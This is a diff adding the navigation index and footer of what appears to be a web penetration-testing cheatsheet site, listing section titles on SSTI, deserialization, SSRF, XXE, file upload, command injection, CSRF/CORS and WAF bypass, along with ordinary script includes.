+    <div class="section-flow-5">
+      <button class="dropdown-btn">5. Server-Side Template Injection
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#ssti-detection">5.1 Detection Methodology</a>
+        <a href="#ssti-jinja2">5.2 Jinja2 (Python)</a>
+        <a href="#ssti-twig">5.3 Twig (PHP)</a>
+        <a href="#ssti-freemarker">5.4 Freemarker (Java)</a>
+        <a href="#ssti-pebble">5.5 Pebble (Java)</a>
+        <a href="#ssti-other">5.6 Other Engines</a>
+        <a href="#ssti-filter-bypass">5.7 SSTI Filter Bypass</a>
+      </div>
+    </div>
+    <div class="section-flow-6">
+      <button class="dropdown-btn">6. Insecure Deserialization
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#deser-php">6.1 PHP (unserialize)</a>
+        <a href="#deser-java">6.2 Java (ysoserial)</a>
+        <a href="#deser-python">6.3 Python (pickle)</a>
+        <a href="#deser-dotnet">6.4 .NET (BinaryFormatter, Json.NET)</a>
+        <a href="#deser-nodejs">6.5 Node.js</a>
+        <a href="#deser-detection">6.6 Detection &amp; Identification</a>
+      </div>
+    </div>
+    <div class="section-flow-7">
+      <button class="dropdown-btn">7. SSRF
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#ssrf-basic">7.1 Basic SSRF</a>
+        <a href="#ssrf-filter-bypass">7.2 Filter Bypass</a>
+        <a href="#ssrf-cloud-metadata">7.3 Cloud Metadata Endpoints</a>
+        <a href="#ssrf-gopher">7.4 Gopher Protocol Exploitation</a>
+        <a href="#ssrf-to-rce">7.5 SSRF to RCE</a>
+      </div>
+    </div>
+    <div class="section-flow-8">
+      <button class="dropdown-btn">8. XXE
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#xxe-basic">8.1 Basic XXE</a>
+        <a href="#xxe-blind">8.2 Blind XXE (Out-of-Band)</a>
+        <a href="#xxe-ssrf">8.3 XXE to SSRF</a>
+        <a href="#xxe-file-read">8.4 XXE File Read Tricks</a>
+        <a href="#xxe-to-rce">8.5 XXE to RCE</a>
+        <a href="#xxe-filter-bypass">8.6 Filter Bypass</a>
+      </div>
+    </div>
+    <div class="section-flow-9">
+      <button class="dropdown-btn">9. File Upload &amp; LFI
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#upload-bypass">9.1 Upload Bypass Techniques</a>
+        <a href="#lfi-to-rce">9.2 LFI to RCE</a>
+        <a href="#lfi-windows">9.3 LFI on Windows</a>
+        <a href="#upload-exploitation">9.4 Upload to Webshell Chain</a>
+        <a href="#path-traversal">9.5 Path Traversal</a>
+      </div>
+    </div>
+    <div class="section-flow-10">
+      <button class="dropdown-btn">10. Command Injection
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#cmdi-patterns">10.1 OS Command Injection Patterns</a>
+        <a href="#cmdi-filter-bypass">10.2 Filter Bypass</a>
+        <a href="#cmdi-eval-code">10.3 Eval / Code Injection</a>
+      </div>
+    </div>
+    <div class="section-flow-11">
+      <button class="dropdown-btn">11. CSRF &amp; CORS
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#csrf-bypass">11.1 CSRF Token Bypass</a>
+        <a href="#csrf-samesite">11.2 SameSite Bypass</a>
+        <a href="#cors-exploit">11.3 CORS Misconfiguration</a>
+      </div>
+    </div>
+    <div class="section-flow-12">
+      <button class="dropdown-btn">12. WAF Bypass
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#waf-encoding">12.1 Encoding Tricks</a>
+        <a href="#waf-http-tricks">12.2 HTTP-Level Bypass</a>
+        <a href="#waf-sqli-bypass">12.3 SQL Injection WAF Bypass</a>
+        <a href="#waf-xss-bypass">12.4 XSS WAF Bypass</a>
+        <a href="#waf-command-bypass">12.5 Command Injection WAF Bypass</a>
+        <a href="#waf-deserialization-bypass">12.6 Deserialization WAF Bypass</a>
+      </div>
+    </div>
+  </div>
+  <!-- End Index -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="credits">
+        <p>
+          &copy; Wencheng Xue<br>
+          Penetration Tester &amp; Vulnerability Researcher
+        </p>
+      </div>
+    </div>
+  </footer><!-- End  Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script defer src="./vendor/aos/aos.js"></script>
+  <script defer src="./vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script defer src="./vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script defer src="./vendor/typed.js/typed.min.js"></script>
+  <!-- Prism JS -->
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-csharp.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-python.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-c.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-java.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-javascript.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-json.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-markup-templating.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-php.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-sql.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-ruby.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script defer src="./js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script defer src="js/prism-langs.js"></script>
+
+  <script defer src="js/site.js"></script>
+  <script defer src="js/cheatsheet-index.js"></script>
+
+</body>
+
+</html>
